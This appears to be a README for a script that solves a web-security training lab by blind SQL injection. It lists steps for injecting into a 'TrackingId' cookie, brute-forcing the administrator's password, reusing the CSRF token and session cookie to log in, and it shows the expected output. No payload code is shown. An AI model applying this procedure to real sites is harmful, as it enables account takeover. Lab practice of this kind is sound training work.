## Hack Steps

1. Inject payload into 'TrackingId' cookie to determine the length of administrator's password based on conditional responses
2. Modify the payload to brute force the administrator's password 
3. Fetch the login page
4. Extract the csrf token and session cookie
5. Login as the administrator
6. Fetch the administrator profile

## Run Script

1. Change the URL of the lab
2. Start script

```
~$ python main.py
```

## Expected Output

```
⦗#⦘ Injection point: TrackingId
⦗1⦘ Determining password length.. 
❯❯ Checking if length = 5 
❯❯ Checking if length = 13 
            .......
❯❯ Checking if length = 20 [ Correct length: 20 ]
⦗2⦘ Brute forcing password.. 
❯❯ Checking if char at position 7 =  q [ Correct password: 16vexiq ]
❯❯ Checking if char at position 15 =  8 [ Correct password: 16vexiq6xv0go08 ]
            .......
❯❯ Checking if char at position 20 =  q [ Correct password: 16vexiq6xv0go08or4vq ]
⦗3⦘ Fetching the login page.. OK
⦗4⦘ Extracting the csrf token and session cookie.. OK
⦗5⦘ Logging in as the administrator.. OK
⦗6⦘ Fetching the administrator profile.. OK
🗹 The lab should be marked now as solved
```
